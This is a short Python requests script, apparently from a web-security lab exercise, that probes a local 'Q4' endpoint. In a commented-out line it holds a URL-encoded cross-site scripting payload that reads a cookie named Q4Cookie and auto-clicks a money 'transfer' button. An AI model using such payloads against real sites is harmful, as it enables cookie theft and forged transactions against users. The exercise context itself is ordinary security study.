import requests
# url = "http://127.0.0.1:2222/Q4?username=&moneyAmount=%3Cscript%3Ealert(document.cookie.split(%27;%20%27).find(row%20=%3E%20row.startsWith(%27Q4Cookie=%27)).split(%27=%27)[1]);%20%20%20%20%20document.getElementById(%27transfer%27).click();%20%3C/script%3E"
# for i in range(1001):
#     x = requests.get(url)
#     if x.text.find("alert") != -1:
#         print(i)
# url = "http:127.0.0.1:2222/Q4?username=AWilbert96&moneyAmount=1"
url = "http:127.0.0.1:2222/Q4"
x = requests.get(url)
print(x.text)